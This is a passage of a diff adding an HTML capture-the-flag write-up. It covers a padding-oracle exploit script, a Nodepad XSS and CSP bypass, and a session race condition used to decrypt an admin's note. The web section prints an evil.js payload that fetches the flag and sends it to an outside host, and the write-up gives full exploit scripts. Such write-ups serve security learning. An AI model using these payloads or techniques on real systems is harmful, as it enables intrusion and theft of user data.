+    new_payload = <span class="hljs-string">''</span>.join([chr(flag[i+offset]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>)])
+    last_payload = chr(flag[<span class="hljs-number">15</span>+offset])
+    <span class="hljs-comment">#x = [68, 114, 103, 110, 83, 123, 84, 104, 97, 110, 107, 95, 103, 111, 100]</span>
+    <span class="hljs-comment">#x = [x[i] ^ ord(new_payload[i]) for i in range(len(x))]</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span>:</span>
+        total = []
+        counter = <span class="hljs-number">15</span>
+        trying = <span class="hljs-number">-1</span>
+        <span class="hljs-keyword">while</span>(counter):
+            trying += <span class="hljs-number">1</span>
+            <span class="hljs-keyword">print</span> (trying)
+            <span class="hljs-comment"># first let a == ''</span>
+            r.send(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span>)
+
+            <span class="hljs-comment"># now try all possible padding length (a.k.a. the last</span>
+            <span class="hljs-comment"># byte of decrypted msg of b) to find out possible value             # of last byte of decrypted msg of b</span>
+            r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+            r.send(new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
+            size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+            x = r.recv(size)
+            <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">in</span> x):
+                <span class="hljs-comment"># which means padding size &lt;= 15</span>
+                total.append(trying)
+                counter -= <span class="hljs-number">1</span>
+        <span class="hljs-keyword">return</span> (total)
+    ret1 = f1()    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(pos)</span>:</span>
+        <span class="hljs-keyword">for</span> trying <span class="hljs-keyword">in</span> pos:
+            <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+                <span class="hljs-keyword">print</span> (length)
+                <span class="hljs-comment"># let a become chr(length)</span>
+                r.send(<span class="hljs-string">'\x01\x00\x00\x00'</span>)
+                r.send(chr(length))
+                <span class="hljs-comment"># try to find out what is last byte of</span>
+                <span class="hljs-comment"># decrypted msg</span>
+                r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+                r.send(new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
+                size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+                x = r.recv(size)
+                <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> x):
+                    <span class="hljs-comment"># which means after unpadding the msg</span>
+                    <span class="hljs-comment"># become one byte and its value is</span>
+                    <span class="hljs-comment"># exactly chr(length)</span>
+                    <span class="hljs-keyword">return</span> (length, trying)
+    ret2_1, ret2_2 = f2(guess(ret1))
+
+    <span class="hljs-comment"># gradually bruteforce each byte of decrypted msg</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span><span class="hljs-params">(start, end)</span>:</span>
+        payload = chr(start)
+        <span class="hljs-keyword">for</span> testing <span class="hljs-keyword">in</span> [<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]:
+            trying = end ^ testing
+            <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+                <span class="hljs-keyword">print</span> (length)
+                <span class="hljs-comment"># let a become payload + chr(length)</span>
+                r.send(chr(<span class="hljs-number">16</span> - testing) + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">3</span>)
+                r.send(payload + chr(length))
+
+                <span class="hljs-comment"># fix (16 - testing)th byte of decrypted msg and</span>
+                <span class="hljs-comment"># bruteforce it</span>
+                r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+                sending = new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload))  + new_payload + chr(trying)
+                r.send(sending)
+                size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+                x = r.recv(size)
+                <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> x):
+                    <span class="hljs-comment"># the (16 - testing)th byte of decrypted</span>
+                    <span class="hljs-comment"># msg is exactly chr(length)</span>
+                    payload += chr(length)
+                    <span class="hljs-keyword">print</span> (<span class="hljs-string">'now payload : '</span>, [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload])
+                    <span class="hljs-keyword">print</span> (<span class="hljs-string">'payload length : '</span>, len(payload))
+                    <span class="hljs-keyword">break</span>
+        <span class="hljs-comment"># this is the final decrypted msg</span>
+        <span class="hljs-keyword">return</span> ([ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload])
+    <span class="hljs-comment"># since ret2_2 can make the padding length become 15, the value of last</span>
+    <span class="hljs-comment"># byte of decrypted msg is exacly ret2_2 ^ 15</span>
+    ret3 = f3(ret2_1, ret2_2 ^ <span class="hljs-number">15</span>)
+
+    <span class="hljs-comment"># xor back the flag </span>
+    <span class="hljs-comment"># this part hasn't been tested, may present some bugs...</span>
+    ret3 = [ret3[i] ^ ord(new_payload[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ret3))]
+    ret3 = [ret3[i] ^ prev[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ret3))] + [ret2_2 ^ <span class="hljs-number">15</span> ^ prev[<span class="hljs-number">-1</span>]]
+    prev = ret3
+    final_flag += <span class="hljs-string">''</span>.join([chr(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ret3])
+<span class="hljs-keyword">print</span> (final_flag)</code></pre><p>flag : <code>DrgnS{Thank_god_no_one_deployed_this_on_production}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="nodepad"><a class="header-link" href="#nodepad"></a>Nodepad</h3>
+<p>Solved by sasdf. Written by bookgin. Thanks to <a href="https://ctftime.org/team/61603">@10sec</a> for the clever JSON bypass technique.</p>
+<p>The challenge description clearly indicates that we need to bypass the CSP. The first thing is to XSS. There is an API that we can add a new note, but a XSS filter is presented, filtering <code>&lt;&gt;</code>. I&#39;ve stuck here for long because I cannot bypass this filter. </p>
+<pre class="hljs"><code>router.post(<span class="hljs-string">'/new'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+  <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/[&lt;&gt;]/</span>;
+
+  <span class="hljs-keyword">let</span> errors = []; 
+  <span class="hljs-keyword">if</span> (regex.test(req.body.title)) {
+    errors.push(<span class="hljs-string">'Title is invalid'</span>);
+  }
+
+  <span class="hljs-keyword">if</span> (regex.test(req.body.content)) {
+    errors.push(<span class="hljs-string">'Content is invalid'</span>);
+  }
+
+  <span class="hljs-keyword">if</span> (errors.length !== <span class="hljs-number">0</span>) {
+    <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'new'</span>, {errors});
+  }
+
+  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> req.db.get <span class="hljs-string">`INSERT INTO notes (title, content, user_id) VALUES (<span class="hljs-subst">${req.body.title}</span>, <span class="hljs-subst">${req.body.content}</span>, <span class="hljs-subst">${req.session.userId}</span>) RETURNING id`</span>;
+  <span class="hljs-keyword">if</span> (result) {
+    <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">`/notes/<span class="hljs-subst">${result.id}</span>`</span>);
+  } <span class="hljs-keyword">else</span> {
+    res.render(<span class="hljs-string">'new'</span>, {<span class="hljs-attr">errors</span>: [<span class="hljs-string">`Error occurred while saving your note`</span>]});
+  }
+});</code></pre><h4 id="bypass-xss-waf-method-1:-json-encoded-request"><a class="header-link" href="#bypass-xss-waf-method-1:-json-encoded-request"></a>Bypass XSS WAF Method 1: JSON-encoded Request</h4>
+<p>In the <code>app.js</code>, the express app server is using JSON parser. Therefore we can send a nested JSON object in the request and then <code>req.body.title</code> will become a javascript object.</p>
+<pre class="hljs"><code>app.use(logger(<span class="hljs-string">'dev'</span>));
+app.use(express.json());
+app.use(express.urlencoded({ <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> }));</code></pre><p>By explicitly specifying the content type, we send a JSON nested object in the request. The title can bypass the regex check since <code>req.body.title</code> is an object <code>{&quot;A&quot;:&quot;&lt;marquee&gt;yo&lt;marquee&gt;&quot;}</code>.</p>
+<pre class="hljs"><code>(<span class="hljs-keyword">async</span> () =&gt; {
+  <span class="hljs-keyword">const</span> rawResponse = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">'http://nodepad.hackable.software:3000/notes/new'</span>, {
+    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
+    <span class="hljs-attr">headers</span>: {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>},
+    <span class="hljs-attr">body</span>: <span class="hljs-built_in">JSON</span>.stringify({<span class="hljs-string">"_csrf"</span>: <span class="hljs-string">"uXw9wsrT-cckWEy1fAO90289t9tOt56309BQ"</span>, <span class="hljs-string">"title"</span>: {<span class="hljs-string">"A"</span>:<span class="hljs-string">"&lt;marquee&gt;yo&lt;marquee&gt;"</span>}, <span class="hljs-string">"content"</span>: <span class="hljs-string">"A"</span>})
+  });
+  <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> rawResponse;
+  <span class="hljs-built_in">console</span>.log(content);
+})();</code></pre><p>Thanks to <a href="https://ctftime.org/team/61603">@10sec</a> for the clever JSON bypass technique again! However our team member @sasdf bypasses the WAF using SQL injection.</p>
+<h4 id="bypass-xss-waf-method-2:-sql-injection"><a class="header-link" href="#bypass-xss-waf-method-2:-sql-injection"></a>Bypass XSS WAF Method 2: SQL Injection</h4>
+<p>@sasdf&#39;s eagle eyes quickly found that there is SQL injection vulnerability.</p>
+<p>They use tagged string template for SQL query to prevent injection, like this:</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> wrap = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">func</span>) </span>{
+  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">parts, ...values</span>) </span>{
+    <span class="hljs-keyword">return</span> func.call(<span class="hljs-keyword">this</span>, parts.reduce ? parts.reduce( <span class="hljs-function">(<span class="hljs-params">[id, acc], x</span>) =&gt;</span> { <span class="hljs-keyword">return</span> id === <span class="hljs-number">0</span> ? [<span class="hljs-number">1</span>, x] : [id+<span class="hljs-number">1</span>, <span class="hljs-string">`<span class="hljs-subst">${acc}</span> \$<span class="hljs-subst">${id}</span> <span class="hljs-subst">${x}</span>`</span>]; }, [<span class="hljs-number">0</span>, <span class="hljs-string">''</span>])[<span class="hljs-number">1</span>] : parts, values);
+  };  
+};
+
+<span class="hljs-keyword">const</span> db = {                                                                                                           
+  <span class="hljs-attr">run</span>: wrap(<span class="hljs-keyword">async</span> (query, params) =&gt; {
+    <span class="hljs-keyword">try</span> {
+      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> pool.query(query, params);
+    } <span class="hljs-keyword">catch</span> (error) {
+      <span class="hljs-keyword">return</span> {<span class="hljs-attr">rows</span>: [], error};
+    }
+  }),
+
+  <span class="hljs-attr">all</span>: wrap(<span class="hljs-keyword">async</span> (query, params) =&gt; {
+    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">await</span> db.run(query, ...params)).rows;
+  }),
+
+  <span class="hljs-attr">get</span>: wrap(<span class="hljs-keyword">async</span> (query, params) =&gt; {
+    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">await</span> db.all(query, ...params))[<span class="hljs-number">0</span>];
+  })
+
+};
+
+<span class="hljs-keyword">await</span> req.db.get <span class="hljs-string">`SELECT * FROM users WHERE name = <span class="hljs-subst">${req.body.name}</span>`</span>;</code></pre><p>Thus even if the <code>req.body.name</code> contains single quotes, for example <code>&#39;=&#39;&#39;</code>, the <code>pool.query</code> will execute the query string <code>SELECT * FROM users WHERE name = $1</code>. <code>$1</code> means the first element of params, so I think it&#39;s not possble to perform SQL injection.</p>
+<p>But they put an extra parenthesis in route <code>notes/:noteId/pin</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">await</span> req.db.run(<span class="hljs-string">`UPDATE notes SET pinned = <span class="hljs-subst">${req.body.value}</span>::boolean WHERE id = <span class="hljs-subst">${req.params.noteId}</span>`</span>);</code></pre><p>The string template evaluate first and then pass to <code>db.run as</code> a string. We can bypass WAF by using <code>body.value</code> to modify title.</p>
+<h4 id="bypass-csp"><a class="header-link" href="#bypass-csp"></a>Bypass CSP</h4>
+<p>The server-side CSP:</p>
+<pre class="hljs"><code>app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
+  res.set(<span class="hljs-string">'X-XSS-Protection'</span>, <span class="hljs-string">'0'</span>);
+  res.set(<span class="hljs-string">'Content-Security-Policy'</span>, <span class="hljs-string">`
+    default-src 'none';
+    script-src 'nonce-<span class="hljs-subst">${res.locals.nonce}</span>' 'strict-dynamic';
+    style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
+    img-src 'self';
+    connect-src 'self';
+    frame-src https://www.google.com/recaptcha/;
+    form-action 'self';
+  `</span>.replace(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">''</span>));
+  next();
+});</code></pre><p>We can use <a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> to help validate the CSP.</p>
+<p>Due to the <code>connect-src</code>, we cannot send a cross-origin request. However, the <code>script-src</code> and <code>base-url</code> is not set properly. Either way can be used to bypass the CSP. I&#39;ll use <code>script-src</code> to bypass the CSP here. For <code>base-uri</code> please refer to <a href="https://github.com/aicioara/ctf/tree/master/2018/2018-05-20-RCTF/web/rBlog2018">this writeup</a>.</p>
+<p>Since <code>script-src</code> is not limited to <code>self</code>, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL. </p>
+<p>Let&#39;s first create a XSS note:</p>
+<pre class="hljs"><code>(<span class="hljs-keyword">async</span> () =&gt; {
+  <span class="hljs-keyword">const</span> rawResponse = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">'http://nodepad.hackable.software:3000/notes/new'</span>, {
+    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
+    <span class="hljs-attr">headers</span>: {
+      <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
+      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
+    },
+    <span class="hljs-attr">body</span>: <span class="hljs-built_in">JSON</span>.stringify({<span class="hljs-string">"_csrf"</span>: <span class="hljs-string">"MHADRFbE-bArsw8pA-f5ZUGpqUM7lMMh_Qfw"</span>, <span class="hljs-string">"title"</span>: {<span class="hljs-string">"a"</span>:<span class="hljs-string">'&lt;script src=http://example.com/evil.js   &gt; //'</span>}, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Balsn"</span>})
+  });
+  <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> rawResponse;
+
+  <span class="hljs-built_in">console</span>.log(content);
+})();</code></pre><p>In the <code>evil.js</code> we simply fetch the flag and send it back to our server:</p>
+<pre class="hljs"><code>$.get(<span class="hljs-string">'flag'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>) </span>{
+        $.ajax({
+                <span class="hljs-attr">url</span>: <span class="hljs-string">"http://example.com/?flag="</span>+text.match(<span class="hljs-string">'alert-success.&gt;(.*)&lt;/div&gt;'</span>)[<span class="hljs-number">1</span>],
+                <span class="hljs-attr">dataType</span>: <span class="hljs-string">'script'</span>
+        }); 
+});
+<span class="hljs-comment">// DrgnS{Ar3_Y0u_T3mP14t3d?}</span></code></pre><h3 id="3nterprise-s0lution"><a class="header-link" href="#3nterprise-s0lution"></a>3NTERPRISE s0lution</h3>
+<p>The server code (some parts are omitted):</p>
+<pre class="hljs"><code><span class="hljs-meta">@app.route('/reg', methods=['POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_register_post</span><span class="hljs-params">()</span>:</span>
+  params = get_required_params(<span class="hljs-string">"POST"</span>, [<span class="hljs-string">'login'</span>, <span class="hljs-string">'passwd'</span>, <span class="hljs-string">'solve'</span>])
+  good_sum = flask.session.get(K_CAPTCHA, <span class="hljs-number">-1</span>)
+  <span class="hljs-keyword">if</span> CAPTCHA_ENABLED <span class="hljs-keyword">and</span> params[<span class="hljs-string">'solve'</span>] != good_sum:
+    add_msg(<span class="hljs-string">'U fail at math ;-('</span>)
+  n = sql_session.query(model.Users).filter_by(username=params.get(<span class="hljs-string">'login'</span>)).count()
+  <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span>:
+    add_msg(<span class="hljs-string">"User already exists !"</span>)
+    <span class="hljs-keyword">return</span> do_render()
+
+  user = model.Users(
+    username=params.get(<span class="hljs-string">'login'</span>),
+    password=backend.password_hash(params.get(<span class="hljs-string">'passwd'</span>)),
+    motd=<span class="hljs-string">""</span>,
+  )
+  sql_session.add(user)
+  sql_session.commit()
+  backend.setup_user(params.get(<span class="hljs-string">'login'</span>))
+  add_msg(<span class="hljs-string">"User created ! login now !"</span>)
+  <span class="hljs-keyword">return</span> do_render()
+
+
+<span class="hljs-meta">@app.route('/login/user', methods=['POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_login_user_post</span><span class="hljs-params">()</span>:</span>
+  username = get_required_params(<span class="hljs-string">"POST"</span>, [<span class="hljs-string">'login'</span>])[<span class="hljs-string">'login'</span>]
+  backend.cache_save(
+    sid=flask.session.sid,
+    value=backend.get_key_for_user(username)
+  )
+  state = backend.check_user_state(username)
+  <span class="hljs-keyword">if</span> state &gt; <span class="hljs-number">0</span>:
+    add_msg(<span class="hljs-string">"user has {} state code ;/ contact backend admin ... "</span>.format(state))
+    <span class="hljs-keyword">return</span> do_render()
+  flask.session[K_LOGGED_IN] = <span class="hljs-keyword">False</span>
+  flask.session[K_AUTH_USER] = username
+
+  <span class="hljs-keyword">return</span> do_302(<span class="hljs-string">"/login/auth"</span>)
+
+
+<span class="hljs-meta">@app.route("/login/auth", methods=['POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_auth_post</span><span class="hljs-params">()</span>:</span>
+  flask.session[K_LOGGED_IN] = <span class="hljs-keyword">False</span>
+  username = flask.session.get(K_AUTH_USER)
+  params = get_required_params(<span class="hljs-string">"POST"</span>, [<span class="hljs-string">"password"</span>, <span class="hljs-string">"token"</span>])
+  hashed = backend.password_hash(params[<span class="hljs-string">'password'</span>])
+  record = sql_session.query(model.Users).filter_by(
+    username=username,
+    password=hashed,
+  ).first()
+  <span class="hljs-keyword">if</span> record <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+    add_msg(<span class="hljs-string">"Fail to login. Bad user or password :-( "</span>, style=<span class="hljs-string">"warning"</span>)
+    <span class="hljs-keyword">return</span> do_render()
+  <span class="hljs-comment"># well .. not implemented yet</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> backend.check_token(username, token=<span class="hljs-number">1</span>):
+    add_msg(<span class="hljs-string">"Fail to verify 2FA !"</span>)
+    <span class="hljs-keyword">return</span> do_render()
+  flask.session[K_LOGGED_IN] = <span class="hljs-keyword">True</span>
+  flask.session[K_LOGGED_USER] = record.username
+  <span class="hljs-keyword">return</span> do_302(<span class="hljs-string">"/home/"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loginzone</span><span class="hljs-params">(func)</span>:</span>
+<span class="hljs-meta">  @functools.wraps(func)</span>
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_wrapper</span><span class="hljs-params">(*a, **kw)</span>:</span>
+    <span class="hljs-keyword">if</span> flask.session.get(K_LOGGED_IN):
+      <span class="hljs-keyword">return</span> func(*a, **kw)
+    <span class="hljs-keyword">else</span>:
+      add_msg(<span class="hljs-string">"Dude ! U R NOT logged in."</span>)
+      do_logout()
+      <span class="hljs-keyword">return</span> do_render()
+
+  <span class="hljs-keyword">return</span> _wrapper
+
+
+<span class="hljs-meta">@app.route("/home/")</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_home</span><span class="hljs-params">()</span>:</span>
+  print(flask.session.sid)
+  print(backend.cache_load(sid=flask.session.sid))
+  perms = backend.check_permisions(flask.session.get(K_LOGGED_USER))
+  <span class="hljs-keyword">return</span> do_render(view=<span class="hljs-string">"home.html"</span>, perms=perms)
+
+
+<span class="hljs-meta">@app.route("/note/list")</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_note_list</span><span class="hljs-params">()</span>:</span>
+  cnt = sql_session.query(model.Notes).count()
+  cur = flask.session.get(K_LOGGED_USER)
+  notes = sql_session.query(model.Notes).filter_by(username=cur).order_by(<span class="hljs-string">"id"</span>).limit(<span class="hljs-number">10</span>).all()
+  <span class="hljs-keyword">return</span> do_render(view=<span class="hljs-string">"notelist.html"</span>, notes=notes, notes_count=cnt)
+
+
+<span class="hljs-meta">@app.route("/note/getkey")</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_note_getkey</span><span class="hljs-params">()</span>:</span>
+  <span class="hljs-keyword">return</span> flask.jsonify(dict(
+    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
+  ))
+
+
+<span class="hljs-meta">@app.route("/note/show/&lt;idx&gt;")</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_note_show</span><span class="hljs-params">(idx)</span>:</span>
+  note = sql_session.query(model.Notes).filter_by(id=idx).first()
+  <span class="hljs-comment"># note = xor_note(note)</span>
+  <span class="hljs-keyword">return</span> do_render(view=<span class="hljs-string">"noteshow.html"</span>, note=note)
+
+
+<span class="hljs-meta">@app.route("/note/add", methods=['GET'])</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_note_add_form</span><span class="hljs-params">()</span>:</span>
+  <span class="hljs-keyword">return</span> do_render(view=<span class="hljs-string">"addnote.html"</span>)
+
+
+<span class="hljs-meta">@app.route("/note/add", methods=['POST'])</span>
+<span class="hljs-meta">@loginzone</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_note_add_post</span><span class="hljs-params">()</span>:</span>
+  text = get_required_params(<span class="hljs-string">"POST"</span>, [<span class="hljs-string">"text"</span>])[<span class="hljs-string">"text"</span>]
+  key = backend.cache_load(flask.session.sid)
+  <span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+    <span class="hljs-keyword">raise</span> WebException(<span class="hljs-string">"Cached key"</span>)
+  text = backend.xor_1337_encrypt(
+    data=text,
+    key=key,
+  )
+  note = model.Notes(
+    username=flask.session[K_LOGGED_USER],
+    message=backend.hex_encode(text),
+  )
+  sql_session.add(note)
+  sql_session.commit()
+  add_msg(<span class="hljs-string">"Done !"</span>)
+  <span class="hljs-keyword">return</span> do_render()</code></pre><p>In the website, we can register an account and login. We are able to add a new note. The note is then XOR encrypted with user&#39;s key.</p>
+<p>Since there is access control when showing the note, we quickly note that note No. 1 is created by admin. However, that note is XOR encrypted with admin&#39;s key.</p>
+<p>So let&#39;s take a further analysis of the code:</p>
+<ol class="list">
+<li>To login, we need first <code>/login/user</code> and then <code>/login/auth</code></li>
+<li><code>backend.cache_save()</code> is used to save the cached key when <code>/login/user</code> </li>
+<li><code>backend.cache_load()</code> is used to retrieve the key when adding a new note</li>
+<li>The cache key depends on the sid, which is saved in the flask session</li>
+<li>The <code>/login/user</code>  API is very slow. It takes about 5 seconds to get response.</li>
+</ol>
+<p>In order to decrypt admin&#39;s note, we want to retrieve admin&#39;s key. If we can set sid to admin, we can add a new XOR encrypted note with admin&#39;s key. Can we manipulate the sid in the session here? Can we abuse the cache key to exploit?</p>
+<p>Yes it&#39;s possible. Let&#39;s exploit flask&#39;s session using race condition. </p>
+<p>First we&#39;ll login as a common user, and then create two connections. The first connection sends POST request with username admin to <code>/login/user</code>. The backend will save admin&#39;s key in the cache.</p>
+<pre class="hljs"><code>backend.cache_save(
+  sid=flask.session.sid,
+  value=backend.get_key_for_user(username)
+)</code></pre><p>The other connection then quickly adds a new note. The backend will load admin&#39;s key from the cache:</p>
+<pre class="hljs"><code>key = backend.cache_load(flask.session.sid)
+<span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+    <span class="hljs-keyword">raise</span> WebException(<span class="hljs-string">"Cached key"</span>)
+text = backend.xor_1337_encrypt(
+  data=text,
+  key=key,
+)</code></pre><p>If done correctly, we can create a new note with admin&#39;s key. Here is the exploit script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment"># admin encrypted note: http://solution.hackable.software:8080/note/show/1</span>
+admin_note_enc = bytes.fromhex(<span class="hljs-string">'07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2'</span>)
+s = requests.session()
+
+<span class="hljs-comment"># Login</span>
+s.post(<span class="hljs-string">'http://solution.hackable.software:8080/login/user'</span>, data=dict(login=<span class="hljs-string">'slowbro'</span>))
+s.post(<span class="hljs-string">'http://solution.hackable.software:8080/login/auth'</span>, data=dict(password=<span class="hljs-string">'slowbro&lt;3'</span>, token=<span class="hljs-string">''</span>))
+sid = s.cookies.get_dict().get(<span class="hljs-string">'solution'</span>)
+
+<span class="hljs-comment"># session race condision: save admin cached key</span>
+subprocess.Popen([
+    <span class="hljs-string">'curl'</span>, <span class="hljs-string">'http://solution.hackable.software:8080/login/user'</span>,
+    <span class="hljs-string">'--cookie'</span>, <span class="hljs-string">'solution='</span> + sid,
+    <span class="hljs-string">'-d'</span>, <span class="hljs-string">'login=admin'</span>
+])
+time.sleep(<span class="hljs-number">1</span>)
+
+<span class="hljs-comment"># encrypt our note with admin's key</span>
+s.post(<span class="hljs-string">'http://solution.hackable.software:8080/note/add'</span>, data=dict(text=<span class="hljs-string">'\x00'</span>*len(admin_note_enc)))
+
+
+<span class="hljs-comment"># my_note : http://solution.hackable.software:8080/note/show/[NOTE_NUMBER]</span>
+my_note_enc = bytes.fromhex(<span class="hljs-string">'4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A4FB198AC92'</span>)
+print(<span class="hljs-string">''</span>.join(chr(i^j) <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> zip(admin_note_enc, my_note_enc)))
+<span class="hljs-string">'''
+Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he 
+'''</span></code></pre><p>Although the race condition seems hard to succeed, actually the <code>/login/user</code>  API is very slow. It almost takes about 5 seconds to get the response. Thus it&#39;s relatively easy to exploit the session using race condition.</p>
+<p>After the competitoin ends, the organizer said <code>backend.check_user_state(username)</code> simply sleeps for 4 seconds. Clearly I think it&#39;s intended for easily exploiting race condition.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
